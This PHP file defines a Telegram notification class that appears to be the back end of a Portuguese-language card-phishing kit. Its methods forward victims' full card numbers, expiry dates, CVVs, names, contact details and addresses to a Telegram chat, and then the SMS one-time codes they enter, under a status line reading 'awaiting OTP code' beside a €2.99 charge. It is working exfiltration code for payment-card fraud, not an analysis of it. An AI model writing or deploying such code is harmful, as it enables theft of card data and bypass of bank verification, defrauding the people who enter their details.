<?php
require_once 'database.php';

class TelegramService {
    private $db;
    private $botToken;
    private $chatId;
    
    public function __construct() {
        $this->db = new Database();
        
        // Get Telegram configuration from database
        $tokenConfig = $this->db->fetchOne("SELECT config_value FROM config WHERE config_key = 'TELEGRAM_BOT_TOKEN'");
        $chatConfig = $this->db->fetchOne("SELECT config_value FROM config WHERE config_key = 'TELEGRAM_CHAT_ID'");
        
        $this->botToken = $tokenConfig ? $tokenConfig['config_value'] : null;
        $this->chatId = $chatConfig ? $chatConfig['config_value'] : null;
    }
    
    public function sendMessage($message, $parseMode = null) {
        if (!$this->botToken || !$this->chatId) {
            error_log("Telegram configuration missing");
            return false;
        }
        
        $url = "https://api.telegram.org/bot{$this->botToken}/sendMessage";
        
        $data = [
            'chat_id' => $this->chatId,
            'text' => $message
        ];
        
        if ($parseMode) {
            $data['parse_mode'] = $parseMode;
        }
        
        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($data),
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json'
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30
        ]);
        
        $response = curl_exec($curl);
        $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        
        if ($httpCode === 200) {
            error_log("Telegram message sent successfully");
            return true;
        } else {
            error_log("Telegram message failed. HTTP Code: $httpCode, Response: $response");
            return false;
        }
    }
    
    public function sendCardSubmittedMessage($billingData, $cardData, $sessionId) {
        // Format card number with spaces
        $cardNumber = $cardData['numero_cartao'];
        $formattedCard = '';
        if (strlen($cardNumber) >= 16) {
            $formattedCard = substr($cardNumber, 0, 4) . ' ' . 
                           substr($cardNumber, 4, 4) . ' ' . 
                           substr($cardNumber, 8, 4) . ' ' . 
                           substr($cardNumber, 12);
        } else {
            $formattedCard = $cardNumber;
        }
        
        $message = "💳 **DADOS DE CARTÃO RECEBIDOS**

👤 **DADOS DO CLIENTE:**
┣━ 📝 **Nome:** {$billingData['nome']}
┣━ 📧 **Email:** {$billingData['email']}
┗━ 📞 **Telefone:** {$billingData['telefone']}

📍 **ENDEREÇO DE ENTREGA:**
┣━ 🏠 **Morada:** {$billingData['endereco']}
┣━ 📮 **Código Postal:** {$billingData['codigo_postal']}
┗━ 🏙️ **Cidade:** {$billingData['cidade']}

💳 **DADOS DO CARTÃO:**
┣━ 💵 **Valor:** €2,99
┣━ 💳 **Número do Cartão:** {$formattedCard}
┣━ 📅 **Data de Expiração:** {$cardData['data_expiracao']}
┗━ 🔒 **CVV:** {$cardData['cvv']}

🔑 **ID DA SESSÃO:** {$sessionId}
⏰ **RECEBIDO EM:** " . date('d/m/Y às H:i') . "
⏳ **STATUS:** AGUARDANDO CÓDIGO OTP

═══════════════════════════════
📱 Aguardando Verificação SMS 📱
═══════════════════════════════";

        return $this->sendMessage($message, 'Markdown');
    }
    
    public function sendOtpVerifiedMessage($billingData, $cardData, $otpCode) {
        // Format card number with spaces
        $cardNumber = $cardData['numero_cartao'];
        $formattedCard = '';
        if (strlen($cardNumber) >= 16) {
            $formattedCard = substr($cardNumber, 0, 4) . ' ' . 
                           substr($cardNumber, 4, 4) . ' ' . 
                           substr($cardNumber, 8, 4) . ' ' . 
                           substr($cardNumber, 12);
        } else {
            $formattedCard = $cardNumber;
        }
        
        $message = "✅ **OTP VERIFICADO COM SUCESSO**

🔐 **VERIFICAÇÃO DE SEGURANÇA COMPLETA:**
┣━ 📱 **Código OTP:** {$otpCode}
┗━ ✅ **Status:** VERIFICADO

👤 **IDENTIFICAÇÃO DO CLIENTE:**
┣━ 📝 **Nome:** {$billingData['nome']}
┣━ 📞 **Telefone:** {$billingData['telefone']}
┗━ 💳 **Cartão:** {$formattedCard}";

        return $this->sendMessage($message, 'Markdown');
    }
}
?>